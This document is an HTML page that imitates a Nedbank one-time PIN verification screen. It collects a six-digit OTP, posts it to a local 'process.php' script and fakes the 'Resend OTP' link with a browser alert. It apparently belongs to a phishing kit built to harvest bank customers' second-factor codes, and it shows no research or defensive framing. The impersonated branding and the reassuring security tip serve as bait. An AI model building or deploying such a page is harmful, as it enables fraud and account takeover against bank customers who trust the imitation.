<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nedbank OTP Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }

        .header {
            background: white;
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }

        .logo {
            font-size: 1.5rem;
            font-weight: bold;
            color: #00a651;
        }

        .header-right {
            display: flex;
            gap: 1.5rem;
            align-items: center;
        }

        .header-link {
            color: #666;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 0.3rem;
            font-size: 0.9rem;
        }

        .phone {
            font-weight: 600;
            color: #333;
        }

        .container {
            max-width: 500px;
            margin: 2rem auto;
            padding: 2rem;
        }

        .otp-section {
            background: white;
            padding: 2.5rem;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            text-align: center;
        }

        .otp-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 1.5rem;
            background: #00a651;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 2rem;
        }

        .otp-title {
            font-size: 1.8rem;
            font-weight: 300;
            margin-bottom: 1rem;
            color: #333;
        }

        .otp-description {
            color: #666;
            margin-bottom: 2rem;
            line-height: 1.5;
        }

        .otp-input-container {
            display: flex;
            justify-content: center;
            gap: 0.8rem;
            margin-bottom: 2rem;
        }

        .otp-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 1.5rem;
            border: 2px solid #ddd;
            border-radius: 4px;
            transition: border-color 0.2s;
        }

        .otp-input:focus {
            border-color: #00a651;
            outline: none;
        }

        .verify-btn {
            width: 100%;
            padding: 0.75rem;
            background: #00a651;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            cursor: pointer;
            margin-bottom: 1.5rem;
            transition: background 0.3s;
        }

        .verify-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }

        .resend-option {
            color: #666;
            font-size: 0.9rem;
            margin-bottom: 1rem;
        }

        .resend-link {
            color: #00a651;
            text-decoration: none;
            font-weight: 500;
        }

        .security-note {
            background: #f8f9fa;
            padding: 1rem;
            border-radius: 4px;
            font-size: 0.8rem;
            color: #666;
            margin-top: 2rem;
            text-align: left;
        }

        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            color: #00a651;
            text-decoration: none;
            margin-top: 1.5rem;
            font-weight: 500;
        }

        @media (max-width: 768px) {
            .header {
                padding: 1rem;
            }

            .header-right {
                gap: 1rem;
            }

            .header-link span:not(:first-child) {
                display: none;
            }

            .container {
                padding: 1rem;
            }

            .otp-section {
                padding: 2rem 1.5rem;
            }

            .otp-input-container {
                gap: 0.5rem;
            }

            .otp-input {
                width: 45px;
                height: 55px;
                font-size: 1.3rem;
            }
        }

        @media (max-width: 480px) {
            .otp-input-container {
                gap: 0.3rem;
            }

            .otp-input {
                width: 40px;
                height: 50px;
                font-size: 1.2rem;
            }
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="logo">Nedbank</div>
        <div class="header-right">
            <a href="#" class="header-link">
                <span>💬</span>
                <span>Chat</span>
            </a>
            <a href="#" class="header-link">
                <span>📍</span>
                <span>Branch locator</span>
            </a>
            <a href="#" class="header-link phone">
                <span>📞</span>
                <span>+27 800 555 111</span>
            </a>
        </div>
    </header>

    <div class="container">
        <div class="otp-section">
            <div class="otp-icon">✓</div>
            <h1 class="otp-title">Verify your identity</h1>
            <p class="otp-description">
                For your security, we've sent a One-Time PIN (OTP) to your registered mobile number.<br>
                Please enter it below to continue.
            </p>
            
            <form id="otpForm" method="POST" action="process.php">
                <input type="hidden" name="action" value="verify_otp">
                <div class="otp-input-container">
                    <input type="text" class="otp-input" maxlength="1" required name="otp1">
                    <input type="text" class="otp-input" maxlength="1" required name="otp2">
                    <input type="text" class="otp-input" maxlength="1" required name="otp3">
                    <input type="text" class="otp-input" maxlength="1" required name="otp4">
                    <input type="text" class="otp-input" maxlength="1" required name="otp5">
                    <input type="text" class="otp-input" maxlength="1" required name="otp6">
                </div>
                
                <button type="submit" class="verify-btn" id="verifyBtn">Verify</button>
            </form>
            
            <div class="resend-option">
                Didn't receive the OTP? <a href="#" class="resend-link" id="resendLink">Resend OTP</a>
            </div>
            
            <div class="security-note">
                <strong>Security tip:</strong> Never share your OTP with anyone. Nedbank will never ask you for your OTP, password, or PIN via email, SMS, or phone call.
            </div>
            
            <a href="index.php" class="back-link">‹ Back to login</a>
        </div>
    </div>

    <script>
        // Focus management for OTP inputs
        const otpInputs = document.querySelectorAll('.otp-input');
        
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // Move to next input if current input is filled
                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                
                checkOTPForm();
            });
            
            input.addEventListener('keydown', (e) => {
                // Move to previous input on backspace if current input is empty
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                }
                
                checkOTPForm();
            });
        });
        
        function checkOTPForm() {
            const verifyBtn = document.getElementById('verifyBtn');
            let allFilled = true;
            
            otpInputs.forEach(input => {
                if (!input.value) {
                    allFilled = false;
                }
            });
            
            verifyBtn.disabled = !allFilled;
        }
        
        // Resend OTP functionality
        document.getElementById('resendLink').addEventListener('click', function(e) {
            e.preventDefault();
            alert('A new OTP has been sent to your registered mobile number.');
        });

        // Auto-focus first OTP input on page load
        document.addEventListener('DOMContentLoaded', function() {
            if (otpInputs.length > 0) {
                otpInputs[0].focus();
            }
        });
    </script>
</body>
</html>